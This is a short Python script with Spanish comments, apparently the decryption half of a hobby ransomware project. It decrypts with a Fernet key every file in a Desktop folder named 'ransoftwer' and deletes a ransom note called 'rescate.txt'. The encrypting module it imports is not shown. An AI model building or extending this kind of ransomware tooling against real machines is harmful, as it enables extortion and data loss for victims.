import incriptacion 

def desencriptar(archivos,key):
	f=incriptacion.Fernet(key)
	for archivo in archivos:
		with open(archivo,'rb') as file:
			encrypted_data=file.read() #leer el archivo 

		decrypted_data=f.decrypt(encrypted_data)

		with open(archivo,'wb') as file:
			file.write(decrypted_data) #cargar los datos y remplazarlos para desencruiptarlos 

incriptacion.cargar_clave()


if __name__=='__main__':
	#encontrar la carpeta que deceo encriptar 
	nombreUsuario=incriptacion.getpass.getuser() 
	direcion_carpeta='C:\\Users\\{}\\Desktop\\ransoftwer'.format(nombreUsuario)
	archivos=incriptacion.os.listdir(direcion_carpeta) #cargar todos los archivos que existen 



	full_path=[direcion_carpeta+'\\'+archivo for archivo in archivos] #la direcion de los archivos 

	key=incriptacion.cargar_clave() #cargar la clave 

	desencriptar(full_path,key) #encriptar los datos

	try:
	    incriptacion.os.remove(direcion_carpeta+'\\'+'rescate.txt') #eliminar la nota de rescate 
	except:
		print('') 